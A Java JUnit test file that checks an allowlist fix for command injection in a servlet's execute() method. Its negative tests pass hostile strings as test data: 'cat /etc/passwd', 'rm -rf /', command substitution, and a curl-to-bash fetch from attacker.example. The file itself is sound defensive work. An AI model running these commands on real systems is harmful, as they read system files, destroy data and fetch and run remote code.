import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import javax.servlet.http.HttpServletRequest;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.Mockito.*;

/**
 * Tests for the command-injection fix in CriticalVulnerabilities.execute().
 *
 * Vulnerability: CWE-77 – The original code passed the raw "cmd" request
 * parameter directly to Runtime.getRuntime().exec(), allowing an attacker
 * to inject arbitrary OS commands.
 *
 * Fix: the method now validates the parameter against a hardcoded allowlist
 * and executes it via ProcessBuilder with an argv list (no shell involved).
 *
 * These tests verify:
 *  1. Allowed commands are accepted without throwing.
 *  2. Injection payloads and unknown commands are rejected with
 *     IllegalArgumentException BEFORE any process is spawned.
 *  3. A null parameter is rejected.
 */
public class CriticalVulnerabilitiesExecuteTest {

    private final CriticalVulnerabilities subject = new CriticalVulnerabilities();

    // -----------------------------------------------------------------------
    // Helper: build a mock request that returns the given "cmd" value.
    // -----------------------------------------------------------------------
    private HttpServletRequest requestWith(String cmd) {
        HttpServletRequest req = mock(HttpServletRequest.class);
        when(req.getParameter("cmd")).thenReturn(cmd);
        return req;
    }

    // -----------------------------------------------------------------------
    // Positive tests – allowed commands must not throw IllegalArgumentException.
    // (The process may or may not be found on the test host; we only assert
    //  that the injection guard itself did not fire.)
    // -----------------------------------------------------------------------

    @ParameterizedTest(name = "allowed command ''{0}'' is accepted by the allowlist guard")
    @ValueSource(strings = {"date", "uptime", "hostname"})
    void allowedCommands_doNotThrowIllegalArgument(String cmd) {
        HttpServletRequest req = requestWith(cmd);
        // The allowlist check must pass.  The process start may throw on the
        // test host if the binary is not present; that is an OS-level failure,
        // not a security failure, so we only check for IllegalArgumentException.
        assertDoesNotThrow(() -> {
            try {
                subject.execute(req);
            } catch (IllegalArgumentException e) {
                // Re-throw – this is the security gate we must not hit.
                throw e;
            } catch (Exception ignored) {
                // Any other exception (e.g., IOException from ProcessBuilder)
                // means the allowlist passed and the OS refused to run the
                // binary – acceptable in a sandboxed test environment.
            }
        });
    }

    // -----------------------------------------------------------------------
    // Negative tests – attack payloads must be rejected with
    // IllegalArgumentException before any process is launched.
    // -----------------------------------------------------------------------

    @Test
    void injectionPayload_semicolonChained_isRejected() {
        HttpServletRequest req = requestWith("date; cat /etc/passwd");
        assertThrows(IllegalArgumentException.class, () -> subject.execute(req));
    }

    @Test
    void injectionPayload_pipeChained_isRejected() {
        HttpServletRequest req = requestWith("date | id");
        assertThrows(IllegalArgumentException.class, () -> subject.execute(req));
    }

    @Test
    void injectionPayload_ampersandChained_isRejected() {
        HttpServletRequest req = requestWith("date && rm -rf /");
        assertThrows(IllegalArgumentException.class, () -> subject.execute(req));
    }

    @Test
    void injectionPayload_backtickSubstitution_isRejected() {
        HttpServletRequest req = requestWith("`id`");
        assertThrows(IllegalArgumentException.class, () -> subject.execute(req));
    }

    @Test
    void injectionPayload_dollarSubstitution_isRejected() {
        HttpServletRequest req = requestWith("$(id)");
        assertThrows(IllegalArgumentException.class, () -> subject.execute(req));
    }

    @Test
    void injectionPayload_newlineControl_isRejected() {
        // Newline (\n = 0x0A) is a common injection separator.
        HttpServletRequest req = requestWith("date\nid");
        assertThrows(IllegalArgumentException.class, () -> subject.execute(req));
    }

    @Test
    void arbitraryCommand_rm_isRejected() {
        HttpServletRequest req = requestWith("rm");
        assertThrows(IllegalArgumentException.class, () -> subject.execute(req));
    }

    @Test
    void arbitraryCommand_sh_isRejected() {
        HttpServletRequest req = requestWith("sh");
        assertThrows(IllegalArgumentException.class, () -> subject.execute(req));
    }

    @Test
    void arbitraryCommand_bash_isRejected() {
        HttpServletRequest req = requestWith("bash");
        assertThrows(IllegalArgumentException.class, () -> subject.execute(req));
    }

    @Test
    void arbitraryCommand_curl_isRejected() {
        HttpServletRequest req = requestWith("curl http://attacker.example/shell.sh | bash");
        assertThrows(IllegalArgumentException.class, () -> subject.execute(req));
    }

    @Test
    void emptyString_isRejected() {
        HttpServletRequest req = requestWith("");
        assertThrows(IllegalArgumentException.class, () -> subject.execute(req));
    }

    @Test
    void nullParameter_isRejected() {
        HttpServletRequest req = requestWith(null);
        assertThrows(IllegalArgumentException.class, () -> subject.execute(req));
    }

    @Test
    void allowedCommandWithTrailingSpace_isRejected() {
        // "date " (with a space) must NOT bypass the allowlist – exact match only.
        HttpServletRequest req = requestWith("date ");
        assertThrows(IllegalArgumentException.class, () -> subject.execute(req));
    }

    @Test
    void allowedCommandWithArgument_isRejected() {
        // "date -u" includes an argument; exact-match allowlist must reject it.
        HttpServletRequest req = requestWith("date -u");
        assertThrows(IllegalArgumentException.class, () -> subject.execute(req));
    }
}
